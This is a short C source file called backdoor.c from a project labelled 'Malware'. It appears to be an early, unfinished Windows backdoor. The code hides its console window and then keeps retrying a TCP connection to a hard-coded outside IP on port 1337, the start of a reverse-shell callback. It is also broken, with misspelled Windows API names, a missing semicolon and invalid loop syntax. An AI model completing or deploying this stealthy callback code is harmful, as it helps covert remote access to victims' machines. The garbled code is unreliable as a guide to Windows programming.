//
//  backdoor.c
//  Malware
//
//  Created by sonumandal on 13/07/20.
//  Copyright © 2020 sonumandal. All rights reserved.
//

#include <stdio.h> // this is a standard library for input output
#include <stdlib> //this is also a stander library using fucn like malloc realloc fre
#include <unistd.h> // NTK
#include <winsock2.h> // this library will be usefull to making connection thoughout the internet
#include <windows.h> //Windows-specific header file for the C and C++ programming languages which contains declarations for all of the functions in the Windows API
#include <winuser.h> //it is used to control windows
#include <wininet.h>//perform all the internet fuctions like FTP, HTTP, basically all the internet funtions also responsible for creating cookies
#include <windowsx.h>
#include <string.h> //this library can manuplate with the c strings and array
#include <sys/stat.h> //the header in the C POSIX library for the C programming language that contains constructs that facilitate getting information about files attributes
#include <sys/types.h>//header contains a number of basic derived types that should be used whenever appropriate. In particular, the following are of special interest

int sock;

int  APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdline, int nCmdshow) {

    HWND stealth; // this will hide the console
    AllocConsole(); // Allocates a new console for the calling process.
    stealth = FindWindowsA("ConsoleWindowsClass", NULL); // WINUSER.H

    ShowWindows(stealth, 0); //show windows or not

    struct sockaddr_in ServAddr;
    unsigned short Servport;  //usinged short rage must be 0 to 65535 it's basically sutable for ports
    char *ServIP;
    WSADATA wsaData; //The WSADATA structure contains information about the Windows Sockets implementation "WINSOCK.H"

    ServIP = "192.186.31.0";
    Servport = 1337;

    if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0) {  //The WSAStartup function initiates use of the Winsock DLL by a process
              exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);
    memset(&ServAddr, 0, sizeof(ServAddr)) //it clears the varialbes with zeros
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(Servport);

    start:
    while connect(sock, (struct sockaddr *) &ServAddr,
    sizeof(ServAddr)); !=0 {
       sleep(5);
       goto start;
    }

}
